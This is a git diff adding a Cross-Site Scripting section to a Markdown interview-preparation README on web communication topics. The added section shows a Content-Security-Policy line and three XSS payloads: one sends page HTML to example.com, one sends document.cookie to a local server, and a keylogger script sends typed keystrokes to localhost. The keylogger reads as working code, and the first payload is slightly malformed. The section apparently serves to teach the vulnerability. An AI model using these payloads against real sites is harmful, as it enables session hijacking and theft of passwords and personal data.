@@ -21,6 +21,12 @@
 4. [Server-Sent Events vs Long Polling](#server-sent-events-vs-long-polling)
 </details>
 
+<details>
+<summary>Security</summary>
+
+1. [Cross Site Scripting](#cross-site-scripting)
+</details>
+   
 ### Communication Protocals
 ![Network Protocal](https://github.com/dhananjaya-poojari/Interview-preparation/assets/77887564/3ed2c187-152b-4521-b7cc-a5a83ecad44b)
 
@@ -343,3 +349,42 @@ Similarities Both SSE and Long Polling:
 Differences
 
 While a Long Polling request will finish as soon as new information arrives, acting like a regular, long-lasting request, an SSE request stays open until the client or the server decides to finish it, and the new information is simply written to the buffer.
+
+### Cross Site Scripting
+Cross-Site Scripting (XSS) is a security vulnerability typically found in web applications. It enables attackers to inject malicious scripts into content delivered to users, potentially leading to a range of harmful actions.
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self'
+```
+
+#### Stealing critical information
+```
+<img src="empty.gif" onerror="var mycookie= document.cookie; new Image.src=*https://example.com/fakepage.php?output=${document.body.innerHTML};" />
+```
+The payload sends the entire HTML content of the current page (document.body.innerHTML) to an external server (https://example.com/fakepage.php).
+
+#### User session hijacking
+```
+?name=<img src="does-not-exist'" onerror="var img = document.createElement('img'); img.src='http://127.0.0.1:5501/cookie?data=${document.cookie}'; document.querySelector('body').appendChild(img);">
+```
+The injected code is an <img> tag with a src attribute pointing to a non-existent image (does-not-exist), triggering the onerror event.The payload sends the user's cookies to an external server controlled by the attacker (http://127.0.0.1:5501/cookie), potentially compromising user sessions.
+
+#### Capturing keystrokes
+```
+var timeout;
+var buffer = "";
+document.querySelector("body").addEventListener("keypress", function(event) {
+    if (event.which !== 0) {
+        clearTimeout(timeout);
+        buffer += String.fromCharCode(event.which);
+        timeout = setTimeout(function() {
+            var xhr = new XMLHttpRequest();
+            var uri = 'http://localhost:3001/keys?data=' + encodeURIComponent(buffer);
+            xhr.open('GET', uri);
+            xhr.send();
+            buffer = "";
+        }, 400);
+    }
+});
+
+```
+Privacy Violation: Captures all keystrokes, including sensitive information such as passwords and personal messages.
